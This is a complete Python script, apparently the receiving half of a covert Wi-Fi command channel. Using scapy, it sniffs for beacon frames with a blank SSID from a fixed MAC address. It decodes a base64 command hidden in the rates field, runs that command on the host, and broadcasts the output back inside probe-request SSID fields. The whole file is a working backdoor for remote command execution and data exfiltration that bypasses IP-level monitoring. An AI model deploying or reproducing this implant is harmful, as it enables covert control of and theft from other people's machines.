#!/usr/bin/python

# python receiver.py mon0

import subprocess
import logging
import time
import base64
import sys

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 

interface=sys.argv[1] #mon0

conf.iface=interface

def executeHere(cmd):
	cmd = base64.b64decode(cmd)
	print "Command: "+cmd
	cmd = cmd.split(" ")
	p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = p.communicate()
	print "Command Output:"
	out = out.rstrip("\n")
	print out
	print "Output Length: "+str(len(out))
	print "Command Error:"
	print err
	print "Error Length: "+str(len(err))
	print "Output Base64 Length: "+str(len(base64.b64encode(out)))
	probereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=base64.b64encode(out))/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")

	print "Sleeping for 5 seconds..."
	time.sleep(5)
	print "Sending output in Probe Request..."
	try:
		sendp(probereq, iface=interface, verbose=0)
	except Exception,e:
		print "Exception: "+str(e)
		print "Sending caught exception..."
		exprobereq = RadioTap()/Dot11(type=0,subtype=4,addr1="ff:ff:ff:ff:ff:ff", addr2="11:22:33:44:55:66",addr3="ff:ff:ff:ff:ff:ff")/Dot11Elt(ID=0,info=base64.b64encode(str(e)))/Dot11Elt(ID=1,info="\x82\x84\x8b\x96")
		sendp(exprobereq, iface=interface, verbose=0)

def packets(pkt):
	try:
		if pkt.haslayer(Dot11):
			if pkt.type == 0 and pkt.subtype == 8 and pkt.info == "" : # if management frame and beacon and SSID is blank
				if pkt.addr2 == "11:22:33:44:55:66":
					print "AP MAC: %s | SSID: %s | Rates: %s" % (pkt.addr2, pkt.info, (pkt[Dot11Elt:2].info))
					#print ':'.join(x.encode('hex') for x in pkt[Dot11Elt:2].info)
					executeHere(str(pkt[Dot11Elt:2].info))
					return True
	except Exception,e:
		print "Something bad happened..."+str(e)


while 1:
	try:
		print "\nSniffing for packets..."
		sniff(iface=interface, stop_filter=packets)
	except Exception,e:
		print "Exception: "+str(e)
